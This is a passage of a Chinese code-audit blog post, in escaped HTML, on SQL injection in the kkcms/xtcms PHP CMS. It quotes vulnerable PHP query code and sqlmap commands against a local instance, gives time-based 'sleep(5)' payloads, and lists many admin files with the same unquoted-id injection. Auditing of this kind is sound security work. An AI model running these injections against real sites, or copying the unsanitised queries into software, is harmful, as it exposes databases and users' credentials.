stripslashes(trim($_POST[&#39;name&#39;]));</code>，这个<code>stripslashes</code>的功能是消除由<code>addslashes</code>函数增加的反斜杠，一个增加一个消除，那这里不就跟没有设置过滤一样吗，因此这个<code>name</code>参数是存在SQL注入的，我们通过BurpSuite进行抓包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151912.png\" alt=\"在这里插入图片描述\"><br>然后将内容复制到一个txt文件中<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151011.png\" alt=\"在这里插入图片描述\"><br>我这里保存在sqlmap目录下<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151149.png\" alt=\"在这里插入图片描述\"><br>而后打开sqlmap，输入如下payload即可</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python sqlmap<span class=\"token operator\">.</span>py <span class=\"token string double-quoted-string\">\"D:/sqlmap/2.txt\"</span> <span class=\"token operator\">--</span>dbs <span class=\"token operator\">--</span>batch<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151220.png\" alt=\"在这里插入图片描述\"><br>可以看到存在延时注入，成功爆破出数据库</p>\n<h3 id=\"vlist-php\"><a href=\"#vlist-php\" class=\"headerlink\" title=\"vlist.php\"></a>vlist.php</h3><p>在这个界面，用单引号测试一下发现跟正常界面有所不同<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151238.png\" alt=\"在这里插入图片描述\"><br>看一下后端代码</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token delimiter important\">?></span></span>\n\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\t\t  <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_vod_class where c_pid='</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cid'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' order by c_sort desc,c_id asc'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\n\t\t\t<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;a href=\"./vlist.php?cid='</span><span class=\"token operator\">.</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c_id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" class=\"acat\" style=\"white-space: pre-wrap;margin-bottom: 4px;\">'</span><span class=\"token operator\">.</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'c_name'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/a>'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里简单看一下的话，不难发现这里的参数<code>cid</code>是不存在任何防护的，即没有被单引号或者双引号包裹，因此这里开头引用的<code>inc.php</code>虽然对SQL注入进行了防护，但在这里其实是没有意义的，用SQLmap跑一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">python sqlmap<span class=\"token operator\">.</span>py <span class=\"token operator\">-</span>u http<span class=\"token punctuation\">:</span><span class=\"token comment\">//127.0.0.1:8080/kkcms-kkcms/vlist.php?cid=1 --dbs --batch</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151381.png\" alt=\"在这里插入图片描述\"></p>\n<h3 id=\"后端文件\"><a href=\"#后端文件\" class=\"headerlink\" title=\"后端文件\"></a>后端文件</h3><p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151468.png\" alt=\"在这里插入图片描述\"><br>扫出多个后端文件存在SQL注入，接下来逐一进行检测</p>\n<h3 id=\"admin-cms-admin-edit-php\"><a href=\"#admin-cms-admin-edit-php\" class=\"headerlink\" title=\"admin/cms_admin_edit.php\"></a>admin/cms_admin_edit.php</h3><p>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//部分代码\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cms_check.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'model/admin_edit.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_manager where m_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话重点关注肯定是SQL语句，也就是这句话</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_manager where m_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>发现id是无引号包裹的，这意味着这里是存在SQL注入的，我们去验证一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151488.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id<span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token keyword\">and</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151605.png\" alt=\"在这里插入图片描述\"></p>\n<p>发现两者回显时间不同，说明存在SQL注入，具体为时间盲注，这里就可以编写Python脚本来爆破数据库信息，也可以通过SQLmap，这里不再展示</p>\n<h3 id=\"admin-cms-login-php-1\"><a href=\"#admin-cms-login-php-1\" class=\"headerlink\" title=\"admin/cms_login.php\"></a>admin/cms_login.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'submit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">alert_href</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'验证码错误'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'cms_login.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入用户名'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入密码'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">null_back</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verifycode'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'请输入验证码'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$a_name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$a_password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a_password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_manager where m_name = \"'</span><span class=\"token operator\">.</span><span class=\"token variable\">$a_name</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" and m_password = \"'</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a_password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\"'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话就是发现这个可控参数都被双引号包裹了，然后文件开头包含了<code>inc.php</code>，意味着存在对SQL注入的防护，因此这里的话是无法实现SQL注入的，转战下一处。</p>\n<h3 id=\"admin-cms-user-edit-php\"><a href=\"#admin-cms-user-edit-php\" class=\"headerlink\" title=\"admin/cms_user_edit.php\"></a>admin/cms_user_edit.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">//部分代码\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cms_check.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'model/user_edit.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_user where u_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>一眼顶真，无包裹方式，存在SQL注入</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">id <span class=\"token operator\">=</span> <span class=\"token number\">16</span> <span class=\"token keyword\">and</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303130151659.png\" alt=\"在这里插入图片描述\"><br>具体不再演示，此类的我将其列在一起，具体如下所示</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">admin<span class=\"token operator\">/</span>cms_nav_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_nav where id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_detail_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_vod where d_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_channel_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_vod_class where c_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_check_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_book where id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_player_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_player where id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_slideshow_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_slideshow where id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_ad_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_ad where id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_link_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_link where l_id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'l_id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_usercard_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_userka where id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nadmin<span class=\"token operator\">/</span>cms_youlian_edit<span class=\"token operator\">.</span>php\n其<span class=\"token constant\">SQL</span>语句如下\n<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select * from xtcms_youlian where id = '</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"admin-cms-user-php\"><a href=\"#admin-cms-user-php\" class=\"headerlink\" title=\"admin/cms_user.php\"></a>admin/cms_user.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'../system/inc.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'cms_check.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'model/user.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\nif (isset($_GET['key'])) &#123;\n$sql = 'select * from xtcms_user where u_name like \"%'.$_GET['key'].'%\" order by u_id desc';\n$pager = page_handle('page',20,mysql_num_rows(mysql_query($sql)));\n$result = mysql_query($sql.' limit '.$pager[0].','.$pager[1].'');\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话参数是在like处，这里的话经过本地测试及查找资料并未发现此处可以进行SQL注入，通过SQLmap扫描也无果，各位大师傅如果有思路的话还请指点一二</p>\n<h3 id=\"admin-cms-detail-php\"><a href=\"#admin-cms-detail-php\" class=\"headerlink\" title=\"admin/cms_detail.php\"></a>admin/cms_detail.php</h3><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cid'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cid'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_vod where d_parent in ('</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cid'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">') order by d_id desc'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$pager</span> <span class=\"token operator\">=</span> <span class=\"token function\">page_handle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">,</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' limit '</span><span class=\"token operator\">.</span><span class=\"token variable\">$pager</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">','</span><span class=\"token operator\">.</span><span class=\"token variable\">$pager</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n\t\t<span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_vod order by d_id desc'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$pager</span> <span class=\"token operator\">=</span> <span class=\"token function\">page_handle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'page'</span><span class=\"token punctuation\">,</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span><span class=\"token function\">mysql_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">' limit '</span><span class=\"token operator\">.</span><span class=\"token variable\">$pager</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">','</span><span class=\"token operator\">.</span><span class=\"token variable\">$pager</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话关注这里</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'select * from xtcms_vod where d_parent in ('</span><span class=\"token 